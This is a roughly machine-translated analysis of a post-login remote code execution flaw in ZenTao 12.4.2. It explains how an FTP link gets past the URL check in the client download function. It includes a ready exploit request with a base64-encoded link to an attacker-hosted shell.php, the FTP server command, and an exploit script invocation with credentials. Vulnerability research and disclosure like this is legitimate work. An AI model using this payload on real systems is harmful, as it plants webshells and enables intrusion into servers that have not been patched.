## Preface

In this article, we will analyze the Zendo 12.4.2 background getshell vulnerability, more than 2 months have passed since the release of this version, this vulnerability will have an impact on the version before 12.4.2, which has been fixed in the new version. In the reproduction of the vulnerability I also read some online articles for the reproduction of the vulnerability, but through repeated testing I found that the method described online in my environment and can not be successfully reproduced, I do not know if there is the same situation of partners, so I have audited the vulnerability points and successfully reproduced, we analyze the following.

 

## Code Analysis

First of all, the vulnerability requires background administrator privileges, so we first login to the background. Through the figure below we can see that the interface URL after login is:
`http://192.168.52.141/zentaopms/www/index.php?m=my&f=index`.

! [img](. /iamge/t012b1edfbb5968327e.png)

We see that the backend interface passes the m and f parameters respectively, so it's not hard to guess that it's probably calling the index method under the my class, let's take a look at the code for that segment.

! [img](. /iamge/t0159e9407d7b4a59e9.png)

Under /module/my/lang/zh-cn.php you can see that there is a method pointing to index, which verifies that our guess above is correct, so let's take a look at the code section for the file download vulnerability point.

! [img](. /iamge/t01e389578003518177.png)

Vulnerability is occurring in the client class under the donwload function, we locate the function to /module/client/control.php to find the method, the code is roughly the meaning of this paragraph will receive three parameters version, os, link, and then go to call **downloadZipPackage ** method file download operation, and some of the download failure events are different back to show, such as downloadFail, saveClientError in the list of methods in the above chart we can see that they call the specific meaning of the method, here will not repeat, and finally if there is no failure event time will return to the success. In downloadZipPackage does not need os method, so this is utilized in our later do not need to pass the parameter.

! [img](https://p1.ssl.qhimg.com/t01bc3554884a1ddd3a.png)

Then to follow up on the downloadZipPackage method, note that the real reason for the vulnerability is in that method.

! [img](. /iamge/t01d664441732fb42e4.png)

We can see that this code first of all the incoming link parameter base64 decoding operation, here the link parameter is the remote address of our shell, and then the following will be through a regular expression to determine whether the link address begins with http:// or https://, if there is a return return to return false and exit the method, otherwise call the method **parent::downloadZipPackage**, here in fact ignore the FTP file download method, that is to say, we can through the FTP service instead of file download operation so as to bypass the restrictions of the regular.

! [img](. /iamge/t01be4bcd3b62e34b7c.png)

The downloadZipPackage method is not a problem, it's a file download function that creates and names a folder under data with the passed in version and saves the downloaded file in it.

 

## Exploit

So this is actually very clear, through the beginning of the article introduces the m and f parameters of the call, we can be on the client class and download parameter call, and pass in the necessary version of the download parameter and link parameter can be completed to exploit the vulnerability of the exploit. Here the link address is the base64 encrypted ftp connection address,,for example.

**ftp://192.168.52.1/shell.php**

you can directly use python pyftpdlib module to open the FTP service is more convenient, the command.

**python -m pyftpdlib -p 21 -d . **Anonymous users are enabled by default, so you don't need to enter a username or password.

! [img](. /iamge/t010ff8a21f7d431f36.png)

Build exp as follows.

``
http://ip/zentaopms/www/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==
```

You can see the popup back to save successfully, and then check in the target machine to find that the download was successful, save path to

```
/zentaopms/www/data/client/1/shell.php
```

! [img](. /iamge/t01e196a8e5fd936c20.png)

Connecting to the Trojan, successfully utilized!

! [img](. /iamge/t01f672108d970a681f.png)

 

## Exploit EXP

! [img](. /iamge/t01af2b24af5c3ddc4c.png)

Build command:`python “Zentao RCE EXP.py” -H http://192.168.52.141 -U admin -P Admin888 -f 192.168.52.1`

where -H specifies the target host, -U specifies the background username, -P specifies the password, -f specifies the IP of the VMnet8 NIC, so that the virtual machine can normally access to the physical machine's FTP service, of course, if the test environment is also in the virtual machine then you can modify the source code to automatically obtain the IP can be.